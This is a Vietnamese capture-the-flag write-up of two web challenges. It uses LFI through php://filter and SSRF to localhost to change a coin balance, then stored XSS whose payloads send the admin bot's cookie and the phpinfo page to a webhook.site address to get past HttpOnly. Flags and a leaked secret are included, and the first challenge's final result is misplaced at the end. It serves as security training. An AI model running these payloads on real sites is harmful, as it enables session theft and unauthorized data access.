# Write-up: Santa 's Shop CTF Chanllenge

# **1. Mục tiêu**

Chúng ta có một tài khoản với 100 coin. Mục tiêu là mua được món quà bí ẩn "Mystery Gift Box" có giá 99,999 coin để lấy Flag. => Vấn đề: Không đủ tiền. Cần tìm cách hack số dư hoặc hack giá tiền.

# **2. Phân tích và khai thác** 

***Lần thứ 1 :*** 
-
- Mình thử truy cập các chức năng của web:
  
  - `Trang Nạp tiền`: `Báo lỗi Error 404.` -> Hướng này bế tắc  
  - `Admin Dashboard`: Hiện thông báo `"Chỉ có thể cập nhật từ localhost"`.

**Đây là gợi ý quan trọng. Server đang kiểm tra IP người dùng, yêu cầu phải là 127.0.0.1. Nếu thoả mãn điều kiện này, ta có thể chỉnh sửa tiền mà không cần đăng nhập Admin.**

- **Khai thác thử** :
  - Vì vậy mình sẽ chọn phương án tấn công vào Admin Dashboard bằng phương pháp giả mạo IP.
  - Ấn vào Admin DashBoard rồi dùng Burpsuite bắt request đó lại rồi send to repeater ,ở đây thêm header **`X-Forward-For: 127.0.0.1`** vào Request rồi send thử nhưng nó vẫn trả về **`chỉ có thể cập nhật coin từ localhost`**.
  - Có khả năng là cái header **`X-Forward-For`** không phải là header mà Server kiểm tra . Vậy thì có thể dùng bất cứ các loại header nào mà lập trình có thể dùng để kiểm tra IP thử xem . Mình đã thử gửi tất cả các biến thể cùng 1 lúc để xem cái nào dính . Tại sao lại cần phải kiểm tra thế này ? Bởi vì server thường chỉ kiểm tra 1 trong số các header trên . Chỉ cần 1 cái đúng thì có thể bypass được 
  - Request của bạn sẽ trông như thế này.

 ```python
 GET /admin.php HTTP/1.1
Host: 67.223.119.69:5017
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
Cookie: PHPSESSID=da28ac2586b8128e301f7508f7201f6c
Connection: keep-alive
````

   - Nhưng Server vẫn báo **`chỉ có thể cập nhật từ localhost`**.

   - **Kết luận**: Server không tin vào các Header do người dùng gửi lên. Khả năng cao Server kiểm tra biến môi trường REMOTE_ADDR ( ( _Bạn có thể hình dung như là , bạn giả IP 127.0.0.1 gửi đến server , nhưng server sẽ không tin ngay mà nó sẽ gửi một phản hồi lại địa chỉ IP 127.0.0.1 đó , nếu bạn nhận được thì server nó mới tin IP bạn gửi đó chính là biến môi trường chứa IP thực_ )


     
     

***Lần thứ 2 :***
-
-  Mình thử vào mã nguồn của trang web đọc thử thì mình nhận thấy cơ chế hiển thị hình ảnh của trang web có điểm đáng ngờ , Thay vì trỏ trực tiếp vào đường dẫn file tĩnh (ví dụ: **`<img src="/images/CandyCane.jpg">`**), thẻ img lại gọi đến một file xử lý PHP:
**`<img src="/file.php?image=resource%2Fimage%2FCandyCane.jpg">**`. Endpoint **`/file.php`** nhận tham số image để đọc file và trả về người dùng . Nếu lập trình viên kiểm tra không kĩ , chúng ta có thể lợi dụng nó để đọc source PHP của chính trang web. ( giải thích thêm cho những bạn chưa biết như mình 

   - _Giải thích thêm : `/file.php` : Đây là một file mã nguồn thực thi . `?image=...` : Đây là nguyên liệu đầu vào . Điều này chứng tỏ Server đang thực hiện quy trình: Nhận đường dẫn từ tham số image -> Đọc nội dung file đó -> Trả về cho người dùng._
- Khai thác đọc Source Code: Mình muốn xem code của **`admin.php`** để biết chính xác nó kiểm tra cái gì. Tuy nhiên, nếu request trực tiếp **`/file.php?image=admin.php`**, server sẽ thực thi file đó chứ không hiện code. => Giải pháp: Dùng **`PHP Wrapper`** để mã hóa nội dung file sang Base64 trước khi hiển thị.
   
        
   - _Giải thích thêm về **`PHP Wrapper`** cho những bạn chưa rõ như mình thì hãy tưởng tượng PHP Wrapper (`php://filter`) giống như một "bộ lọc". Bình thường, Server thấy file .php là sẽ chạy ngay lập tức. Nhưng khi đi qua bộ lọc này, code bị biến đổi thành dạng mã hóa (Base64) - tức là chỉ còn là các ký tự văn bản vô hại. Nhờ đó, Server bị "lừa" và in toàn bộ nội dung file ra màn hình thay vì thực thi nó._
 
**Payload** : **`GET /file.php?image=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1`**

**Kết quả** : Server trả về một chuỗi ký tự Base64 dài. Sau khi Decode chuỗi đó, mình thu được source code của admin.php như sau
```php
<?php
require_once 'config.php';
$secret = trim(file_get_contents("/secret.txt")); // đọc file secret.txt nằm ở thư mục gốc
// đoạn này kiểm tra ip 
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    // http_response_code(403);
    die("Chỉ có thể cập nhật coin từ localhost !");
}
// kiểm tra tham số đầu vào -> tức là chỉ cần có username là được , ko bắt buộc phải admin
if (!isset($_GET['username']) || !isset($_GET['coin']) || !isset($_GET['secret'])) {
    die("Vui lòng nhập username, coin và SECRET");
}
// đoạn này kiểm tra secret có chính xác không
if ($secret !== $_GET['secret']){
    die("SECRET bạn nhập không chính xác.");
}
// nếu mọi thứ oke thì cập nhật tiền 
$username = trim($_GET['username']);
$coin = (int)$_GET['coin'];

try {
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        die("Không tìm thấy user: " . htmlspecialchars($username));
    }

    $stmt = $conn->prepare("UPDATE users SET coin = ? WHERE username = ?");
    $stmt->execute([$coin, $username]);

    echo "Đã cập nhật coin cho <b>{$username}</b> thành <b>{$coin}</b>!";
} catch (PDOException $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>

```
- Từ code này, ta biết để hack được tiền, ta cần 2 thứ:

  - Mã Secret: Nằm trong file `/secret.txt`
  - Request từ Localhost: Phải truy cập từ `127.0.0.1`


 
#
***Lần thứ 3***
-
**Lấy secret và tấn công**

- Tận dụng lại lỗ hổng LFI ở trên để đọc file `/secret.txt`. 

**Payload**:
**`GET /file.php?image=php://filter/convert.base64-encode/resource=/secret.txt HTTP/1.1`**

**Kết quả** : Mình lại nhận được thêm một chuỗi base64 **`Q2hpQ29uMUJ1b2NOdWFUaG9pfl9+Cg==`** và sau khi decode thì nhận được chuỗi secret là **`ChiCon1BuocNuaThoi~_~`**

- Sau khi lấy được secret rồi thì cần phải truy cập từ 127.0.0.1 (Chúng ta không thể Fake IP bằng Header vì code dùng `$_SERVER['REMOTE_ADDR']` - _là một biến siêu toàn cục (superglobal) trong PHP, chứa địa chỉ IP thực của người dùng (máy khách) đang kết nối và xem trang web hoặc ứng dụng của bạn_ )

- Lợi dụng chính file.php. Nếu file.php cho phép đọc file từ URL (SSRF), chúng ta sẽ bảo server "Tự gọi chính mình". Khi server tự gọi `http://127.0.0.1/admin.php`-> Bypass thành công! Nhưng làm thế nào để biết được nó có lỗi **SSRF** hay không ? -> thì cứ thử gửi `?image=http://gooogle.com` , nếu nó hiển thị ra cả trang google thì tức là có lỗi **SSRF**.

  - Giải thích dễ hiểu hơn thì nó như thế này 
  - Giả sử `image=http://127.0.0.1/admin.php` thì ra lệnh: Hàm `file_get_contents()` trong `file.php` nhận được đường dẫn `http://127.0.0.1/admin.php`.
  - Server (đang chạy `file.php`) . Nó tự tạo một kết nối HTTP mới xuất phát từ chính nó để gửi tới địa chỉ `127.0.0.1`.
  - Trang `admin.php` nhận được request này , nó kiểm tra xem ai đang gọi đến bằng cách nhìn vào biến **REMOTE_ADDR**.
  - Vì request này do Server tự gửi đi từ bên trong, nên **REMOTE_ADDR** hiển thị là `127.0.0.1`. -> bypass thành công

- URL mục tiêu cần gọi : `http://127.0.0.1/admin.php?username=test1&coin=999999&secret=ChiCon1BuocNuaThoi~_~`, nhưng nếu ta nhúng trực tiếp url trên vào tham số image thì server sẽ hiểu rằng `&` là dấu ngắt tham số dẫn đến mất dữ liệu `coin` và `secret`. -> cần phải encoding `&` thành `%26` .

- **Payload**: **`GET /file.php?image=http://127.0.0.1/admin.php?username=test1%26coin=999999%26secret=ChiCon1BuocNuaThoi~_~`**


# Write-up : Hori 's blog

# 1. Mục tiêu 

- Một trang web dạng Blog cho phép người dùng đăng bài viết (gồm Tiêu đề, Nội dung, và Upload ảnh). 
- Hệ thống có một trang bot.php để gửi đường dẫn cho Bot (Admin) truy cập. 
- Ngoài ra còn có trang `phpinfo.php`.
- Mục tiêu cần đạt: Lấy được Flag nằm trong Cookie của Admin (Bot).

# 2. Phân tích và khai thác 

***Lần thứ 1*** :
-
- Mình thử truy cập vào POST thì thấy có mục upload file nên nghi ngờ lỗ hổng Unrestricted File Upload 😓
- Mình thử upload một file PHP xem sao kết quả web trả về ❌ Only image files (PNG, JPG, GIF) are allowed. Vậy là Server chặn, chỉ cho phép đuôi ảnh (.jpg, .png, .gif).
- Không chịu thua , mình thử bypass bằng Double Extension và chỉnh Magic Bytes.
  
  - Đổi tên file thành `shell.php.gif` (Double Extension) Để lừa bộ lọc đuôi file: Server nhìn thấy đuôi `.gif` ở cuối cùng -> "À, đây là file ảnh, cho qua!".
  - Vì máy tính thường quản lí , đọc file các thứ dựa trên các dòng mã nhị phân nhưng nếu nó đọc hết nội dung một file thì quá lâu để có thể xử lý cho nên thường thì chỉ đọc vài byte đầu tiên để phân biệt các loại file thôi 
  - vậy nên trong cái file mình chèn vào đó , ở dòng để tiên sẽ chèn thêm GIF89a ở đầu ( đây là của file gif ) ,Khi Server đọc file, nó thấy chữ GIF89a ở đầu -> "Nội dung file này đúng chuẩn GIF rồi, không phải file rác."
- **Kết quả**: Upload thành công, nhưng khi truy cập file, Server chỉ hiển thị nó như một bức ảnh lỗi, không thực thi mã PHP.
- Tiếp tục mình lại thử bypass bằng **.htaccess** để ép server chạy file ảnh như file php nhưng lại quên mất ban đầu nó đã nói chỉ cho chạy file `.jpg` , `.png` , `.gif` . 
- Kết quả: Thất bại. Server chặn tên file , chỉ chấp nhận các đuôi mở rộng hình ảnh hợp lệ.

**Kết luận : Server được cấu hình tốt, không thể khai thác lỗ hổng Upload để chạy mã lệnh**
-
***Lần thứ 2:***
-
Dựa vào gợi ý "Flag in cookie", mục tiêu chuyển sang tấn công XSS để đánh cắp Cookie của Bot.

Đầu tiên mình thử kiểm tra xem các điểm đầu vào coi phần input nào không được bảo mật kĩ càng . Thử chèn payload đơn giản `<script>alert(1)</scrpit>` vào Title , Nội dung . 

Sau khi thử chèn vào các vị trí, mình kiểm tra Source Code và nhận được kết quả thú vị:

- Tại Tiêu đề (Title): Thất bại. Server đã mã hóa các ký tự đặc biệt. Dấu < bị biến thành `&lt`. Code không thể chạy 
- Tại Nội dung (Content): Thành công! Server giữ nguyên các thẻ HTML mà mình nhập vào ( như <script>). -> Kết luận: Lỗ hổng XSS nằm ở phần Content của bài viết.



Tiếp theo mình sẽ tạo một Webhook  đóng vai trò là server của kẻ tấn công để hứng dữ liệu trả về. Mình sử dụng Payload sau chèn vào phần Content:

`<script>
  fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?c=' + document.cookie);
</script>`

- _Giải thích:_

  `<script>...</script>`: Khai báo cho trình duyệt biết đây là đoạn mã JavaScript

  `document.cookie`: Lệnh JavaScript dùng để truy xuất toàn bộ Cookie của người dùng hiện tại (ở đây là Bot).

  `fetch(...)`: Hàm trong JavaScript dùng để gửi một HTTP Request đến một địa chỉ khác

  `?c=...`: gắn giá trị Cookie lấy được vào tham số c trên URL. Khi Webhook nhận được request, chỉ cần nhìn vào URL là thấy Cookie.


  <img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/9f64dd76-549e-4da5-8228-2ecff0073c68" />


Sau khi gửi link bài viết chứa mã độc cho Bot truy cập, Webhook của mình đã không nhận được bất kì một request nào , có thể là do thẻ `<script>` nó không hoạt động 


<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/51e6384e-901d-4066-9173-99e599f9b709" />

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/a98acc73-ca5a-49ef-b1eb-3f64cfe69722" />




Sau đó mình thử chuyển sang sử dụng payload "uy tín" hơn là thẻ `<img>` kết hợp sự kiện `onerror`

- `<img src=x onerror="fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32?flag='+document.cookie)">`

Giải thích câu lệnh cho các bạn dễ hiểu thì 
 - `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.

- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép

Sau khi gửi link bài viết chứa mã độc cho Bot truy cập , Webhook của mình lần này đã nhận được request nhưng cookie nó trả về lại là 1 chuỗi rỗng . 

Nguyên nhân: Server đã bật cờ HttpOnly cho Cookie của Admin.Vì thế, lệnh document.cookie trả về chuỗi rỗng, và chúng ta không lấy được Flag trực tiếp.

- Giải thích thềm về HttpOnly : _Là một lớp bảo vệ bảo mật được gán cho Cookie. Khi Cookie có cờ này, trình duyệt sẽ ngăn chặn JavaScript (lệnh document.cookie) đọc giá trị của nó. Mục đích chính là để giảm thiểu thiệt hại khi trang web bị lỗi XSS_.



---
***Lần thứ 3***
-
Bây giờ chỉ còn lại trang `PHPINFO` là chưa được khai thác đến 
- Quan sát: Trang này hiển thị chi tiết mọi thông tin cấu hình của PHP trên server: phiên bản PHP, hệ điều hành (OS), các module extension, và các biến môi trường...

- Mình thử Ctrl + F tìm chữ `"flag"` xem có vô tình lộ lọt gì không, nhưng kết quả là con số 0 tròn trĩnh 😓. Có vẻ Flag không nằm cố định ở đây.
Tuy nhiên, sau khi tìm hiểu thì có cơ chế hoạt động đặc biệt của hàm `phpinfo()`: `Trang phpinfo()` không chỉ hiển thị cấu hình tĩnh của server, mà nó còn in ra toàn bộ HTTP Headers của request gửi đến nó.

Điều này có nghĩa là:
 
- Nếu mình (User thường) truy cập -> Nó in Cookie của mình.
- Nếu Bot (Admin) truy cập -> Nó sẽ in Cookie của Admin (chứa Flag) ra màn hình dưới dạng văn bản (Text).
- Và quan trọng nhất: Khi Cookie đã biến thành văn bản HTML nằm trên trang web, thì JavaScript hoàn toàn có thể đọc được, bất chấp việc Cookie đó có cờ `HttpOnly` hay không (vì JS đang đọc nội dung trang web `response.text()`, chứ không phải đọc `document.cookie`).

-> Kế hoạch tấn công mới (Exploit Chain): Sử dụng lỗ hổng XSS đã tìm thấy ở phần Content, viết một đoạn mã JavaScript bắt trình duyệt của Bot thực hiện 2 việc:

- Truy cập ngầm (fetch) vào /phpinfo.php để kích hoạt việc in Cookie Admin ra Source Code.
- Đọc toàn bộ Source Code đó và gửi về Webhook của mình.

Payload (Chèn vào phần Content):

```javascript
<img src=x onerror="
    fetch('/phpinfo.php')
    .then(r => r.text())
    .then(d => {
        fetch('https://webhook.site/997f8339-d7fc-4ad3-a257-9bc92ba45d32', {
            method: 'POST',
            mode: 'no-cors',
            body: d
        })
    })
">
```
Giải thích : 
- `src=x`: Đường dẫn ảnh sai, chắc chắn sẽ gây lỗi tải ảnh.
- `onerror="..."`: Khi lỗi xảy ra, trình duyệt lập tức chạy đoạn code JS bên trong dấu ngoặc kép.
- Đoạn JS bên trong thực hiện 2 bước: (1) Đọc trộm trang `phpinfo.php` -> (2) Bắn dữ liệu về Webhook.

<img width="400" height="400" alt="image" src="https://github.com/user-attachments/assets/a4d00c77-4dc4-40ef-b2fd-35ffbf42f44b" />


Quay sang webhook , mình nhận về một mớ dữ liệu hỗn độn thử Ctrl + F từ flag thì thấy `FLAG=KCSC{PhP_InFO_d1sPl4Ys_c0okIe_iNf0rm4tiOn!!!}`

# 3. Bài học rút ra
Góc nhìn phòng thủ : 
-
- Phải áp dụng cơ chế làm sạch (Sanitize) và mã hóa (Encode) đầu vào trên tất cả các trường mà người dùng có thể nhập liệu. Chỉ một sơ hở nhỏ cũng dẫn đến XSS.
- HttpOnly chỉ ngăn chặn việc đọc cookie trực tiếp bằng JS (document.cookie), nhưng không ngăn chặn việc cookie bị lộ qua các kênh khác (như phpinfo, các trang debug, hoặc lỗi lộ header)
- Các file như phpinfo.php, test.php, .git, .env... là kho báu của Hacker. Luôn xóa sạch các file debug và file cấu hình thừa trước khi public website.

Góc nhìn tấn công  
- 
- Khi thấy một chỗ bị chặn (ví dụ Title bị lọc), đừng vội nản lòng. Hãy thử tất cả các đầu vào khác (Content) . Developer thường chỉ fix những chỗ "nổi bật" và bỏ quên những chỗ khuất.
- Đừng chỉ dập khuôn dùng `<script>alert(1)</script>`.
- Nếu `<script`> bị chặn hoặc không chạy (do `innerHTML`), hãy chuyển sang các thẻ khác như `<img>`, `<body>`, `<svg>` kết hợp với các sự kiện `onerror`, `onload`.
- Bài này dạy kỹ thuật kết hợp: Dùng XSS để kích hoạt lỗi lộ thông tin (phpinfo), từ đó bypass cơ chế bảo vệ (HttpOnly) để đạt mục đích cuối cùng (Lấy Cookie).
- Hiểu rằng trình duyệt luôn tự động gửi Cookie kèm theo request (kể cả HttpOnly)

- **Kết quả** : **Đã cập nhật coin cho <b>test1</b> thành <b>999999</b>!**

**Vậy là đã cập nhật đươc số tiền từ 100 lên 999999 , bây giờ chỉ cần vào lại web và mua Mystery Gift Box để xem flag thôi** 

`flag : KCSC{m3rry_chr1stm4s_4nd_h4ppy_h4ck1ng}`
